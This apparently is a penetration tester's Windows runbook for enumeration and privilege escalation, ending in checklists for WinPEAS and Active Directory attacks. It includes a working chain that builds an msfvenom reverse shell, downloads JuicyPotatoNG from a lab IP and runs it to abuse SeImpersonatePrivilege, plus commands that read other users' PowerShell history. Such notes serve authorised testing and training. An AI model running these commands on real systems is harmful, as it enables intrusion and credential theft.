# Windows Runbook


## Enumeration and Privilege Escalation

### Basic User Enum

```
whoami
whoami /priv
net user
net user /domain
systeminfo
ipconfig
```

if `SeImpersonatePrivilege`:


```
sudo msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=443 -f exe -o payloads/shell.exe
iwr -uri http://192.168.45.215/JuicyPotatoNG.exe -outfile JuicyPotatoNG.exe
./JuicyPotatoNG.exe -t * -p "./shell.exe" 
```

### Enumerate the machine

Anything interesting in the root of C?
```
ls C:/
```

Anything interesting in the current users' home folder?

```
ls C:/Users/user/
ls C:/Users/user/Desktop
ls C:/Users/user/Documents
ls "C:/Program Files (x86)"
ls "C:/Program Files"
```

What's installed on the machine?

32-bit:
```
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
```
64-bit:

```
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
```

Finally, to get running processes:

```
Get-Process
```

Check history of all users:

```
more C:\Users\user\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

Environment variables:
```
Get-ChildItem -Path Env:
```

### WinPeas checklist


* What servers are running on the machine. Can we gain access to an internal HTTP server or something like that?
* Is there a Task or Service running on the machine that we can abuse?
  * If a non-default service is present that looks promising, but you don't have write permissions to the .exe,
    check if it is missing a dll with procmon.
* Is the machine set up with `AlwaysInstallElevated` ?
* Anything that winpeas highlights as an escalation factor?
* Is there e.g. a web server running as root, or MySQL/MSSQL?

### AD Checklist - Run this if you have valid AD creds

* Any users kerberoastable?
* Any users ASREP-roastable?
* Run bloodhound and visualize the AD. Anything comes to mind?
* GMSAReadPassword?
* LAPS? https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/laps

